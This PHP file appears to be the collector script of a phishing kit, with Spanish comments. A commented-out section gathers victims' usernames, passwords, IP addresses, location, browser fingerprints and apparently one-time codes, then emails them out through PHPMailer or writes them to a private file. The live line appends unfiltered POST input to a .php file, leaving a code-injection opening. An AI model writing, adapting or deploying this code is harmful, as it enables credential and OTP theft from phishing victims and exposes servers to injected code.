<?php
//require ("PHPMailer/class.phpmailer.php");   envio de correo

//$_POST['doc_type'] variable a usar

 /*
                    ejemplo concatenacion de datos
         			@$bilsmg   = "------------------+| formdataformajax |+------------------".'<br>'.PHP_EOL;
					$bilsmg   .= "---TPO---".$_POST['uname'].'<br>'.PHP_EOL;
					$bilsmg   .= "---TPO---".$_POST['psw'].'<br>'.PHP_EOL;
					$bilsmg   .= "---TPO---".$_POST['ip'].'<br>'.PHP_EOL;
					$bilsmg   .= "---TPO---".$_POST['latitude'].'<br>'.PHP_EOL;
					$bilsmg   .= "---TPO---".$_POST['fingerprint'].'<br>'.PHP_EOL;
					$bilsmg   .= "---TPO---".$_POST['ot'].'<br>'.PHP_EOL;
					$bilsmg   .= "--------------+| backup | formdata |+--------------".PHP_EOL;

$mail = new PHPMailer(); // create a new object
$mail->IsSMTP(); // enable SMTP
$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
$mail->SMTPAuth = true; // authentication enabled
$mail->SMTPSecure = ''; // ssl or tls secure transfer enabled REQUIRED for GMail
$mail->Host = "";
$mail->Port = 465;//  465 or 587
$mail->IsHTML(true);
$mail->Username = ""; correo
$mail->Password = ""; password
$mail->SetFrom("");//agregar correo
$mail->Subject = "info"; 
$mail->Body = $bilsmg;
$mail->CharSet = 'UTF-8';
$mail->AddAddress("");//agregar correo 
$mail->Send();	
			
//crear archivo modo pro 	
//file_put_contents('private/datosacceso.php', $bilsmg.PHP_EOL, FILE_APPEND | LOCK_EX);
			//@mkdir('private/',0777);
			//$open = fopen('private/data.txt', 'w');
			//fwrite($open, $bilsmg."\r\n\r\n");
			//fclose($open);
*/

//crear archivo 		 
file_put_contents('formdataformajax.php', $_POST['doc_type'].PHP_EOL, FILE_APPEND | LOCK_EX);


